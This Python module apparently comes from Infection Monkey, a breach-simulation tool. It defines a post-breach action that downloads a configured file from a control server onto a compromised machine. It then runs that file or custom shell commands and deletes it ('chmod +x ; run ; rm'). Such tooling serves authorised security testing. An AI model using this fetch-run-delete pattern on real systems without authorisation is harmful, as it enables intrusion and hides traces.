import os
import logging

from infection_monkey.utils import is_windows_os
from infection_monkey.post_breach.pba import PBA
from infection_monkey.control import ControlClient
from infection_monkey.config import WormConfiguration
from infection_monkey.utils import get_monkey_dir_path

LOG = logging.getLogger(__name__)

__author__ = 'VakarisZ'

# Default commands for executing PBA file and then removing it
DEFAULT_LINUX_COMMAND = "chmod +x {0} ; {0} ; rm {0}"
DEFAULT_WINDOWS_COMMAND = "{0} & del {0}"

DIR_CHANGE_WINDOWS = 'cd %s & '
DIR_CHANGE_LINUX = 'cd %s ; '


class UsersPBA(PBA):
    """
    Defines user's configured post breach action.
    """
    def __init__(self):
        super(UsersPBA, self).__init__("File execution")
        self.filename = ''
        if not is_windows_os():
            # Add linux commands to PBA's
            if WormConfiguration.PBA_linux_filename:
                if WormConfiguration.custom_PBA_linux_cmd:
                    # Add change dir command, because user will try to access his file
                    self.command = (DIR_CHANGE_LINUX % get_monkey_dir_path()) + WormConfiguration.custom_PBA_linux_cmd
                    self.filename = WormConfiguration.PBA_linux_filename
                else:
                    file_path = os.path.join(get_monkey_dir_path(), WormConfiguration.PBA_linux_filename)
                    self.command = DEFAULT_LINUX_COMMAND.format(file_path)
                    self.filename = WormConfiguration.PBA_linux_filename
            elif WormConfiguration.custom_PBA_linux_cmd:
                self.command = WormConfiguration.custom_PBA_linux_cmd
        else:
            # Add windows commands to PBA's
            if WormConfiguration.PBA_windows_filename:
                if WormConfiguration.custom_PBA_windows_cmd:
                    # Add change dir command, because user will try to access his file
                    self.command = (DIR_CHANGE_WINDOWS % get_monkey_dir_path()) + WormConfiguration.custom_PBA_windows_cmd
                    self.filename = WormConfiguration.PBA_windows_filename
                else:
                    file_path = os.path.join(get_monkey_dir_path(), WormConfiguration.PBA_windows_filename)
                    self.command = DEFAULT_WINDOWS_COMMAND.format(file_path)
                    self.filename = WormConfiguration.PBA_windows_filename
            elif WormConfiguration.custom_PBA_windows_cmd:
                self.command = WormConfiguration.custom_PBA_windows_cmd

    def _execute_default(self):
        if self.filename:
            UsersPBA.download_pba_file(get_monkey_dir_path(), self.filename)
        return super(UsersPBA, self)._execute_default()

    @staticmethod
    def should_run(class_name):
        if not is_windows_os():
            if WormConfiguration.PBA_linux_filename or WormConfiguration.custom_PBA_linux_cmd:
                return True
        else:
            if WormConfiguration.PBA_windows_filename or WormConfiguration.custom_PBA_windows_cmd:
                return True
        return False

    @staticmethod
    def download_pba_file(dst_dir, filename):
        """
        Handles post breach action file download
        :param dst_dir: Destination directory
        :param filename: Filename
        :return: True if successful, false otherwise
        """

        pba_file_contents = ControlClient.get_pba_file(filename)

        if not pba_file_contents or not pba_file_contents.content:
            LOG.error("Island didn't respond with post breach file.")
            return False
        try:
            with open(os.path.join(dst_dir, filename), 'wb') as written_PBA_file:
                written_PBA_file.write(pba_file_contents.content)
            return True
        except IOError as e:
            LOG.error("Can not upload post breach file to target machine: %s" % e)
            return False
